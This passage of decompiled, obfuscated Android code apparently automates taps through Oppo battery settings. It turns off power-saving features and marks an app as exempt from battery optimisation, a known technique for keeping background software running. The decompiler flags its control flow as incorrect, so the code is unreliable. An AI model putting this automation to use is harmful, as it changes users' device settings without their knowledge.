      0x036b: PHI (r5v61 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v59 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v62 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:151:0x0368, B:19:0x005d] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:156:0x0378 A[PHI: r5
      0x0378: PHI (r5v63 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v61 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v64 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:154:0x0375, B:18:0x0056] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:159:0x0388 A[PHI: r5
      0x0388: PHI (r5v65 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v63 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v66 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:157:0x0385, B:17:0x004f] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:15:0x0045 A[PHI: r5
      0x0045: PHI (r5v69 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v67 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v70 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:163:0x03a4, B:14:0x0040] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:162:0x039a A[PHI: r5
      0x039a: PHI (r5v67 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v65 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v68 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:160:0x0397, B:16:0x0048] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:167:0x03b3 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:168:0x03b4 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:37:0x00cf A[PHI: r5
      0x00cf: PHI (r5v31 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v29 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v32 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:95:0x025d, B:36:0x00ca] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:58:0x014d A[PHI: r5
      0x014d: PHI (r5v6 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v4 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v7 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:56:0x0149, B:47:0x0119] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:73:0x01bc  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x01e3  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x0202 A[PHI: r5
      0x0202: PHI (r5v21 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v19 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v22 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:80:0x01fe, B:42:0x00f0] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:85:0x021f A[PHI: r5
      0x021f: PHI (r5v23 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v21 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v24 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:83:0x021b, B:41:0x00e9] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:88:0x022d A[PHI: r5
      0x022d: PHI (r5v25 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v23 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v26 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:86:0x0229, B:40:0x00e2] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:91:0x0242 A[PHI: r5 r6
      0x0242: PHI (r5v27 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v25 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v28 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:89:0x023e, B:39:0x00d9] A[DONT_GENERATE, DONT_INLINE]
      0x0242: PHI (r6v8 long) = (r6v7 long), (r6v9 long) binds: [B:89:0x023e, B:39:0x00d9] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:94:0x0253 A[PHI: r5
      0x0253: PHI (r5v29 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v27 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v30 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:92:0x024f, B:38:0x00d2] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:67:0x0193 -> B:69:0x0197). Please report as a decompilation issue!!! */
    /* renamed from: e3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212339e3(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$mOppo$1 oppoStepsSimplified$mOppo$1;
        C0368a5 c0368a5;
        C0368a5 c0368a52;
        boolean zM212313a8;
        C0368a5 c0368a53;
        int i;
        C0368a5 c0368a54;
        boolean z;
        boolean zM212313a82;
        long j;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof OppoStepsSimplified$mOppo$1) {
            oppoStepsSimplified$mOppo$1 = (OppoStepsSimplified$mOppo$1) continuationImpl;
            int i2 = oppoStepsSimplified$mOppo$1.f54615a5;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$mOppo$1.f54615a5 = i2 - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$mOppo$1 = new OppoStepsSimplified$mOppo$1(this, continuationImpl);
            }
        }
        Object objM212314a9 = oppoStepsSimplified$mOppo$1.f54613a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        boolean z2 = true;
        switch (oppoStepsSimplified$mOppo$1.f54615a5) {
            case 0:
                kg1.m213544f4(objM212314a9);
                m212303e0("[mOppo] case 8");
                if (this.f55113a2 > 34) {
                    oppoStepsSimplified$mOppo$1.f54610a0 = this;
                    oppoStepsSimplified$mOppo$1.f54615a5 = 1;
                    if (m212344e8(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                        c0368a52 = this;
                        oppoStepsSimplified$mOppo$1.f54610a0 = c0368a52;
                        oppoStepsSimplified$mOppo$1.f54615a5 = 2;
                        if (c0368a52.m212314a9("电池", 5, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                            oppoStepsSimplified$mOppo$1.f54610a0 = c0368a52;
                            oppoStepsSimplified$mOppo$1.f54615a5 = 3;
                            break;
                        }
                    }
                } else {
                    oppoStepsSimplified$mOppo$1.f54610a0 = this;
                    oppoStepsSimplified$mOppo$1.f54615a5 = 14;
                    if (m212344e8(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                        c0368a5 = this;
                        oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                        oppoStepsSimplified$mOppo$1.f54615a5 = 15;
                        if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                            oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                            oppoStepsSimplified$mOppo$1.f54615a5 = 16;
                            if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                oppoStepsSimplified$mOppo$1.f54615a5 = 17;
                                if (c0368a5.m212314a9("更多设置#高级设置#智能省电场景#更多", 5, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                    oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                    oppoStepsSimplified$mOppo$1.f54615a5 = 18;
                                    if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                        if (!c0368a5.m212315b2("睡眠待机优化")) {
                                            c0368a5.m212315b2("待机耗电优化");
                                        }
                                        oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                        oppoStepsSimplified$mOppo$1.f54615a5 = 19;
                                        if (c0368a5.m212354f9(100L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                            if (!c0368a5.m212313a8("耗电异常优化")) {
                                                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                oppoStepsSimplified$mOppo$1.f54615a5 = 20;
                                                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                    oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                    oppoStepsSimplified$mOppo$1.f54615a5 = 21;
                                                    if (c0368a5.m212352f7(3, 1500L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                        String strM212334d7 = c0368a5.m212334d7();
                                                        oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                        oppoStepsSimplified$mOppo$1.f54615a5 = 22;
                                                        objM212314a9 = c0368a5.m212314a9(strM212334d7, 25, oppoStepsSimplified$mOppo$1);
                                                        if (objM212314a9 != coroutineSingletons) {
                                                            if (!((Boolean) objM212314a9).booleanValue()) {
                                                                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                                oppoStepsSimplified$mOppo$1.f54615a5 = 23;
                                                                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                                    c0368a5.m212313a8("不优化");
                                                                    oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                                    oppoStepsSimplified$mOppo$1.f54615a5 = 24;
                                                                    if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                                        oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                                        oppoStepsSimplified$mOppo$1.f54615a5 = 25;
                                                                        if (c0368a5.m212345e9(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                                            oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                                            oppoStepsSimplified$mOppo$1.f54615a5 = 26;
                                                                            if (c0368a5.m212345e9(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                                                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                                                oppoStepsSimplified$mOppo$1.f54615a5 = 27;
                                                                                if (c0368a5.m212344e8(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                                                    oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                                                    oppoStepsSimplified$mOppo$1.f54615a5 = 28;
                                                                                    if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                                                        oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                                                        oppoStepsSimplified$mOppo$1.f54615a5 = 29;
                                                                                        if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                                                            c0368a5.m212313a8("省电模式");
                                                                                            oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                                                            oppoStepsSimplified$mOppo$1.f54615a5 = 30;
                                                                                            if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                                                                c0368a5.m212315b2("省电模式");
                                                                                                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                                                                oppoStepsSimplified$mOppo$1.f54615a5 = 31;
                                                                                                if (c0368a5.m212354f9(100L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                                                                    oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                                                                                                    oppoStepsSimplified$mOppo$1.f54615a5 = 32;
                                                                                                    if (c0368a5.m212345e9(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                                                                        oppoStepsSimplified$mOppo$1.f54610a0 = null;
                                                                                                        oppoStepsSimplified$mOppo$1.f54615a5 = 33;
                                                                                                        if (c0368a5.m212345e9(oppoStepsSimplified$mOppo$1) == coroutineSingletons) {
                                                                                                            return c1351vv;
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                c0368a52 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a52;
                oppoStepsSimplified$mOppo$1.f54615a5 = 2;
                if (c0368a52.m212314a9("电池", 5, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                c0368a52 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a52;
                oppoStepsSimplified$mOppo$1.f54615a5 = 3;
                break;
            case 3:
                c0368a52 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                c0368a52.getClass();
                m212303e0("[mOppo] 步骤3: 准备点击[电池模式]...");
                zM212313a8 = false;
                c0368a53 = c0368a52;
                i = 1;
                if (i >= 4 && !(zM212313a8 = c0368a53.m212313a8("电池模式"))) {
                    z = z2;
                    m212303e0("[mOppo] 步骤3: 第" + i + "次尝试失败，等待300ms...");
                    oppoStepsSimplified$mOppo$1.f54610a0 = c0368a53;
                    oppoStepsSimplified$mOppo$1.f54611a1 = zM212313a8;
                    oppoStepsSimplified$mOppo$1.f54612a2 = i;
                    oppoStepsSimplified$mOppo$1.f54615a5 = 4;
                    break;
                } else {
                    c0368a53.getClass();
                    m212303e0("[mOppo] 步骤3: clickV(电池模式) 最终结果=" + zM212313a8);
                    oppoStepsSimplified$mOppo$1.f54610a0 = c0368a53;
                    oppoStepsSimplified$mOppo$1.f54615a5 = 5;
                    if (c0368a53.m212354f9(500L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                        c0368a54 = c0368a53;
                        c0368a54.getClass();
                        m212303e0("[mOppo] 步骤4: 准备点击[均衡模式]...");
                        c0368a54.m212316b3("电池模式弹窗");
                        zM212313a82 = c0368a54.m212313a8("均衡模式");
                        m212303e0("[mOppo] 步骤4: clickV(均衡模式) 返回=" + zM212313a82);
                        if (!zM212313a82) {
                            m212303e0("[mOppo] ⚠️ 均衡模式点击失败，尝试返回关闭弹窗...");
                            oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                            oppoStepsSimplified$mOppo$1.f54615a5 = 6;
                            if (c0368a54.m212345e9(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                            }
                        }
                        oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                        oppoStepsSimplified$mOppo$1.f54615a5 = 7;
                        if (c0368a54.m212354f9(500L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                            c0368a54.getClass();
                            m212303e0("[mOppo] 步骤5: 准备滚动查找[省电设置]...");
                            c0368a54.m212316b3("电池主页");
                            oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                            oppoStepsSimplified$mOppo$1.f54615a5 = 8;
                            if (c0368a54.m212314a9("省电设置", 5, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                                oppoStepsSimplified$mOppo$1.f54615a5 = 9;
                                if (c0368a54.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                    c0368a54.m212315b2("自动进入省电模式");
                                    oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                                    oppoStepsSimplified$mOppo$1.f54615a5 = 10;
                                    j = 100;
                                    if (c0368a54.m212354f9(100L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                        c0368a54.m212315b2("睡眠待机优化");
                                        oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                                        oppoStepsSimplified$mOppo$1.f54615a5 = 11;
                                        if (c0368a54.m212354f9(j, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                            oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                                            oppoStepsSimplified$mOppo$1.f54615a5 = 12;
                                            if (c0368a54.m212345e9(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                                                oppoStepsSimplified$mOppo$1.f54610a0 = null;
                                                oppoStepsSimplified$mOppo$1.f54615a5 = 13;
                                                if (c0368a54.m212345e9(oppoStepsSimplified$mOppo$1) == coroutineSingletons) {
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 4:
                i = oppoStepsSimplified$mOppo$1.f54612a2;
                boolean z3 = oppoStepsSimplified$mOppo$1.f54611a1;
                c0368a53 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                zM212313a8 = z3;
                z = true;
                i++;
                z2 = z;
                if (i >= 4) {
                    break;
                }
                c0368a53.getClass();
                m212303e0("[mOppo] 步骤3: clickV(电池模式) 最终结果=" + zM212313a8);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a53;
                oppoStepsSimplified$mOppo$1.f54615a5 = 5;
                if (c0368a53.m212354f9(500L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                c0368a54 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                c0368a54.getClass();
                m212303e0("[mOppo] 步骤4: 准备点击[均衡模式]...");
                c0368a54.m212316b3("电池模式弹窗");
                zM212313a82 = c0368a54.m212313a8("均衡模式");
                m212303e0("[mOppo] 步骤4: clickV(均衡模式) 返回=" + zM212313a82);
                if (!zM212313a82) {
                }
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                oppoStepsSimplified$mOppo$1.f54615a5 = 7;
                if (c0368a54.m212354f9(500L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                c0368a54 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                oppoStepsSimplified$mOppo$1.f54615a5 = 7;
                if (c0368a54.m212354f9(500L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                c0368a54 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                c0368a54.getClass();
                m212303e0("[mOppo] 步骤5: 准备滚动查找[省电设置]...");
                c0368a54.m212316b3("电池主页");
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                oppoStepsSimplified$mOppo$1.f54615a5 = 8;
                if (c0368a54.m212314a9("省电设置", 5, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                c0368a54 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                oppoStepsSimplified$mOppo$1.f54615a5 = 9;
                if (c0368a54.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 9:
                c0368a54 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                c0368a54.m212315b2("自动进入省电模式");
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                oppoStepsSimplified$mOppo$1.f54615a5 = 10;
                j = 100;
                if (c0368a54.m212354f9(100L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                c0368a54 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                j = 100;
                c0368a54.m212315b2("睡眠待机优化");
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                oppoStepsSimplified$mOppo$1.f54615a5 = 11;
                if (c0368a54.m212354f9(j, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case oe0.DEFAULT_M /* 11 */:
                c0368a54 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a54;
                oppoStepsSimplified$mOppo$1.f54615a5 = 12;
                if (c0368a54.m212345e9(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                c0368a54 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = null;
                oppoStepsSimplified$mOppo$1.f54615a5 = 13;
                if (c0368a54.m212345e9(oppoStepsSimplified$mOppo$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                break;
            case 13:
                kg1.m213544f4(objM212314a9);
                return c1351vv;
            case 14:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 15;
                if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 16;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 16:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 17;
                if (c0368a5.m212314a9("更多设置#高级设置#智能省电场景#更多", 5, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 17:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 18;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 18:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                if (!c0368a5.m212315b2("睡眠待机优化")) {
                }
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 19;
                if (c0368a5.m212354f9(100L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                if (!c0368a5.m212313a8("耗电异常优化")) {
                }
                return coroutineSingletons;
            case 20:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 21;
                if (c0368a5.m212352f7(3, 1500L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 21:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                String strM212334d72 = c0368a5.m212334d7();
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 22;
                objM212314a9 = c0368a5.m212314a9(strM212334d72, 25, oppoStepsSimplified$mOppo$1);
                if (objM212314a9 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 22:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                if (!((Boolean) objM212314a9).booleanValue()) {
                }
                return coroutineSingletons;
            case 23:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                c0368a5.m212313a8("不优化");
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 24;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 24:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 25;
                if (c0368a5.m212345e9(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 25:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 26;
                if (c0368a5.m212345e9(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 26:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 27;
                if (c0368a5.m212344e8(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 27:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 28;
                if (c0368a5.m212314a9("电池", 5, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 28:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 29;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 29:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                c0368a5.m212313a8("省电模式");
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 30;
                if (c0368a5.m212354f9(300L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 30:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                c0368a5.m212315b2("省电模式");
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 31;
                if (c0368a5.m212354f9(100L, oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 31:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = c0368a5;
                oppoStepsSimplified$mOppo$1.f54615a5 = 32;
                if (c0368a5.m212345e9(oppoStepsSimplified$mOppo$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 32:
                c0368a5 = oppoStepsSimplified$mOppo$1.f54610a0;
                kg1.m213544f4(objM212314a9);
                oppoStepsSimplified$mOppo$1.f54610a0 = null;
                oppoStepsSimplified$mOppo$1.f54615a5 = 33;
                if (c0368a5.m212345e9(oppoStepsSimplified$mOppo$1) == coroutineSingletons) {
                }
                break;
            case 33:
                kg1.m213544f4(objM212314a9);
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:109:0x026c A[PHI: r5 r11
      0x026c: PHI (r5v23 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v21 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v24 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:107:0x0268, B:51:0x0152] A[DONT_GENERATE, DONT_INLINE]
      0x026c: PHI (r11v4 java.lang.String) = (r11v2 java.lang.String), (r11v5 java.lang.String) binds: [B:107:0x0268, B:51:0x0152] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:112:0x027a A[PHI: r5 r11
      0x027a: PHI (r5v25 com.storm.safe.rock.service.modules.yw5xud.a5) = (r5v23 com.storm.safe.rock.service.modules.yw5xud.a5), (r5v26 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:110:0x0276, B:50:0x0149] A[DONT_GENERATE, DONT_INLINE]
      0x027a: PHI (r11v6 java.lang.String) = (r11v4 java.lang.String), (r11v7 java.lang.String) binds: [B:110:0x0276, B:50:0x0149] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:115:0x028d A[PHI: r5 r11
